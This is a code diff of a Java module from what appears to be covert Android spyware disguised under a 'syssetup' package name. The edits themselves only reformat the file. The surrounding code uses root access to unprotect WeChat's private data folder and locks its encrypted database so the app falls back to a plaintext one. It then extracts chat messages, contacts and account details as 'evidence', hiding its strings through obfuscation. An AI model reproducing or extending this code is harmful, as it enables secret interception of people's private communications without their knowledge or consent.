@@ -1,15 +1,8 @@
 package com.android.syssetup.module.chat;
 
-import java.io.File;
-import java.io.IOException;
-import java.util.ArrayList;
-import java.util.Arrays;
-import java.util.Date;
-import java.util.List;
-import java.util.concurrent.Semaphore;
-
 import android.database.Cursor;
 
+import com.android.mm.M;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.db.GenericSqliteHelper;
 import com.android.syssetup.db.RecordVisitor;
@@ -18,21 +11,26 @@ import com.android.syssetup.manager.ManagerModule;
 import com.android.syssetup.module.ModuleAddressBook;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.StringUtils;
-import com.android.mm.M;
+
+import java.io.File;
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.Date;
+import java.util.List;
+import java.util.concurrent.Semaphore;
 
 public class ChatWeChat extends SubModuleChat {
 	private static final String TAG = "ChatWeChat";
 
 	private static final int PROGRAM = 0x0a;
 
-	private static final String DEFAULT_LOCAL_NUMBER =  M.e("local");
+	private static final String DEFAULT_LOCAL_NUMBER = M.e("local");
+	String myPhone = DEFAULT_LOCAL_NUMBER;
 	String pObserving = M.e("com.tencent.mm");
-
 	// private String myPhoneNumber = "local";
 	String myId;
 	String myName;
-	String myPhone = DEFAULT_LOCAL_NUMBER;
-
 	Semaphore readChatSemaphore = new Semaphore(1, true);
 
 	private Long lastLine;
@@ -59,7 +57,7 @@ public class ChatWeChat extends SubModuleChat {
 
 	/**
 	 * Estrae dal file RegisterPhone.xml il numero di telefono
-	 * 
+	 *
 	 * @return
 	 */
 	@Override
@@ -79,9 +77,9 @@ public class ChatWeChat extends SubModuleChat {
 	/**
 	 * Apre msgstore.db, estrae le conversazioni. Per ogni conversazione legge i
 	 * messaggi relativi
-	 * 
+	 * <p/>
 	 * Se wechat non puo' scrivere nel db cifrato, switcha su quello in chiaro
-	 * 
+	 *
 	 * @throws IOException
 	 */
 	private void readChatWeChatMessages() {
@@ -109,7 +107,7 @@ public class ChatWeChat extends SubModuleChat {
 
 			// Get DB Dir
 			boolean ret = Path.unprotect(M.e("/data/data/com.tencent.mm/MicroMsg/"), 2, false);
-			if(!ret){
+			if (!ret) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (readChatWeChatMessages) Error: cannot unprotect wechat");
 				}
@@ -143,7 +141,7 @@ public class ChatWeChat extends SubModuleChat {
 
 			// chmod 000, chown root:root
 			Path.lock(dbDir + dbEncFile);
-			
+
 			// TODO: si potrebbe killare wechat
 			if (Path.unprotect(dbDir, dbFile, true)) {
 				if (Cfg.DEBUG) {
@@ -170,7 +168,7 @@ public class ChatWeChat extends SubModuleChat {
 					}
 
 					newLastLine = fetchMessages(helper, groups, lastLine);
-				}finally {
+				} finally {
 					helper.disposeDb();
 				}
 
@@ -265,7 +263,7 @@ public class ChatWeChat extends SubModuleChat {
 				return createTime;
 			}
 		};
-		long lastCreationLine = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastLine) }, visitor);
+		long lastCreationLine = helper.traverseRawQuery(sqlquery, new String[]{Long.toString(lastLine)}, visitor);
 
 		getModule().saveEvidence(messages);
 
@@ -273,7 +271,7 @@ public class ChatWeChat extends SubModuleChat {
 	}
 
 	private void saveWechatContacts(GenericSqliteHelper helper) {
-		String[] projection = new String[] { M.e("username"), M.e("nickname")};
+		String[] projection = new String[]{M.e("username"), M.e("nickname")};
 
 		boolean tosave = false;
 		RecordVisitor visitor = new RecordVisitor(projection, M.e("nickname not null ")) {
@@ -285,7 +283,7 @@ public class ChatWeChat extends SubModuleChat {
 				String nick = cursor.getString(1);
 
 				Contact c = new Contact(username, username, nick, "");
-				if (username != null && username.startsWith( M.e("wxid"))) {
+				if (username != null && username.startsWith(M.e("wxid"))) {
 					if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.WECHAT, c)) {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (cursor) need to serialize");
@@ -297,7 +295,7 @@ public class ChatWeChat extends SubModuleChat {
 			}
 		};
 
-		if (helper.traverseRecords( M.e("rcontact"), visitor) == 1) {
+		if (helper.traverseRecords(M.e("rcontact"), visitor) == 1) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveWeChatContacts) serialize");
 			}
@@ -322,7 +320,7 @@ public class ChatWeChat extends SubModuleChat {
 			}
 		};
 
-		long ret = helper.traverseRecords( M.e("userinfo"), visitor);
+		long ret = helper.traverseRecords(M.e("userinfo"), visitor);
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (setMyAccount) %s, %s, %s", myId, myName, myPhone);
 		}
@@ -330,7 +328,7 @@ public class ChatWeChat extends SubModuleChat {
 		if (!DEFAULT_LOCAL_NUMBER.equals(myPhone)) {
 			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WECHAT, myId, myName);
 		}
-		
+
 	}
 
 	private ChatGroups getChatGroups(GenericSqliteHelper helper) {
